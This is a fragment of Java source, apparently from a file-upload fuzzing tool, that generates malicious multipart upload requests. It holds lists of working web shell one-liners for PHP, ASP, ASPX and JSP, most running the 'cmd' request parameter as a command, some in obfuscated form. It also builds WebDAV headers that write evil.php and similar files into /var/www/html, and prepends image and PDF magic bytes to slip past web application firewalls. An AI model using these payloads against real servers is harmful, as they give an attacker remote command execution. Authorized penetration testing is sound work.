        List<String> suffix = Arrays.asList("php", "asp", "aspx", "jsp");

        for (String eachSuffix : suffix) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, eachSuffix);

            
            String tempTemplateWebdav = tempTemplateSuffix;
            String webdavHeaders = "Destination: file:///var/www/html/evil." + eachSuffix + "\r\nOverwrite: T\r\n";

            if (tempTemplateWebdav.contains("Content-Type:")) {
                webdavPayload.add(tempTemplateWebdav.replace("Content-Type:",
                        webdavHeaders + "Content-Type:"));
            }
        }

        return webdavPayload;
    }

    private static List<String> fileContentBypassFuzz(String template, String filenameSuffix) {
        
        List<String> contentBypassPayload = new ArrayList<>();

        
        Pattern originalContentPattern = Pattern.compile("Content-Type:.*?\\r\\n\\r\\n(.*?)(?:\\r\\n-{10,})", Pattern.DOTALL);
        Matcher originalContentMatcher = originalContentPattern.matcher(template);
        String originalContent = "";
        String contentPart = null;

        if (originalContentMatcher.find()) {
            originalContent = originalContentMatcher.group(1);
            
            contentPart = originalContentMatcher.group(0);
        }

        
        List<String> phpContents = Arrays.asList(
                "<?php eval($_POST[\"cmd\"]); ?>",
                "<?php system($_REQUEST[\"cmd\"]); ?>",
                "<?= `$_GET[0]`; ?>",  
                "<?php $_GET[a](base64_decode($_GET[b])); ?>",  
                "<?php $a=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);$a($_POST[x]); ?>",  
                "<?php include $_GET[\"file\"]; ?>",  
                "<?php preg_replace(\"/.*/e\",base64_decode($_POST[\"x\"]),\"\"); ?>",  
                "<?php $_=\"{\"; $_=($_^\"<\").($_^\">\").($_^\"/\"); ?><?php ${$_}[_]($_POST[x]);?>",  
                "<script language=\"php\">eval($_POST[\"cmd\"]);</script>"  
        );

        
        List<String> aspContents = Arrays.asList(
                "<%eval request(\"cmd\")%>",  
                "<%execute request(\"cmd\")%>",  
                "<%response.write CreateObject(\"WScript.Shell\").exec(request(\"cmd\")).StdOut.ReadAll()%>",  
                "<%execute(request(\"cmd\"))%>",  
                "<%eval(Replace(chr(112)+chr(97)+chr(115)+chr(115),chr(112)+chr(97)+chr(115)+chr(115),request(\"cmd\")))%>"  
        );

        
        List<String> aspxContents = Arrays.asList(
                "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>",
                "<%@ Page Language=\"C#\" %><%eval(Request.Item[\"cmd\"]);%>",
                "<%@ Page Language=\"C#\" %><% System.IO.StreamWriter sw=new System.IO.StreamWriter(Request.Form[\"f\"]);sw.Write(Request.Form[\"c\"]);sw.Close(); %>",
                "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"cmd\"],\"unsafe\");%>"
        );

        
        List<String> jspContents = Arrays.asList(
                "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
                "<%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>",
                "<% out.println(\"Output: \" + request.getParameter(\"cmd\")); %>",
                "<%! public void jspInit(){ try{ java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); }catch(Exception e){} } %>"
        );

        
        List<String> wafEvasionPrefixes = Arrays.asList(
                "GIF89a;\n",  
                "#!MIME type image/gif\n",  
                "<!--\n", 
                ";base64,\n",  
                "BM\n",  
                "%PDF-1.5\n",  
                "ID3\n"  
        );

        
        for (String ext : Arrays.asList("php", "asp", "aspx", "jsp")) {
            String tempTemplate = template;
            String tempTemplateSuffix = tempTemplate.replace(filenameSuffix, ext);

            
            List<String> contents;
            if (ext.equals("php")) {
                contents = phpContents;
            } else if (ext.equals("asp")) {
                contents = aspContents;
            } else if (ext.equals("aspx")) {
                contents = aspxContents;
            } else {
                contents = jspContents;
            }

            
            for (int i = 0; i < Math.min(2, contents.size()); i++) {  
                String content = contents.get(i);
                if (contentPart != null && originalContent != null && !originalContent.isEmpty()) {
                    
                    String newContent = contentPart.replace(originalContent, content);
                    contentBypassPayload.add(tempTemplateSuffix.replace(contentPart, newContent));

                    
                    for (int j = 0; j < Math.min(3, wafEvasionPrefixes.size()); j++) {
                        String prefix = wafEvasionPrefixes.get(j);
                        String newContentWithPrefix = contentPart.replace(originalContent, prefix + content);
                        contentBypassPayload.add(tempTemplateSuffix.replace(contentPart, newContentWithPrefix));
                    }

                    
                    if (ext.equals("php")) {
                        String newContentWithComment = contentPart.replace(originalContent, "/*\n*/\n" + content);
                        contentBypassPayload.add(tempTemplateSuffix.replace(contentPart, newContentWithComment));

                        String newContentWithNewline = contentPart.replace(originalContent, content.replace("<?php", "<?php\n"));
                        contentBypassPayload.add(tempTemplateSuffix.replace(contentPart, newContentWithNewline));
                    }

                    
                    if (ext.equals("asp") || ext.equals("aspx")) {
                        String newContentWithComment = contentPart.replace(originalContent, "<!-- -->" + content);
                        contentBypassPayload.add(tempTemplateSuffix.replace(contentPart, newContentWithComment));
                    }
                } else {
                    
                    contentBypassPayload.add(tempTemplateSuffix);
                }
            }
        }

        return contentBypassPayload;
    }

    private static List<String> removeDuplicates(List<String> list) {
        Set<String> set = new HashSet<>(list);
        return new ArrayList<>(set);
    }
}